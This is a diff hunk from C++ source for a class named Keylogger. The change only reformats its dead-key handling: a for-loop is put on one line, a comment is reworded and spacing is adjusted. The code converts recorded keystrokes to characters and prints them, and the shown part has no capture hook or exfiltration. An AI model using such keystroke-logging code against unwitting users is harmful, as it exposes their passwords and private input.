@@ -72,16 +72,13 @@ void Keylogger::handleOutput() {
 				(upper ? KBDSHIFT : 0) | (ctrl ? KBDCTRL : 0) | (alt ? KBDALT : 0)
 			];
 
-			//Key and dead key handling
+			//Key + dead key handling
 			if (loadedDeadKey) {
 				const auto& deadKeys = layout.pDeadKey;
 				const long keyAndDiacritic = MAKELONG(keyLayout.wch[index], loadedDeadKey);
 
 				bool found = false;
-				for (int i = 0
-					;deadKeys[i].dwBoth
-					;i++)
-				{
+				for (int i = 0; deadKeys[i].dwBoth; i++) {
 					const auto& deadKey = deadKeys[i];
 					const auto& curKeyAndDiacritic = deadKey.dwBoth;
 					if (keyAndDiacritic == curKeyAndDiacritic) {
@@ -90,9 +87,11 @@ void Keylogger::handleOutput() {
 						break;
 					}
 				}
+
 				if (!found) {
 					std::wcout << loadedDeadKey << keyLayout.wch[index];
 				}
+
 				loadedDeadKey = 0;	
 			}
 			//Load dead key 
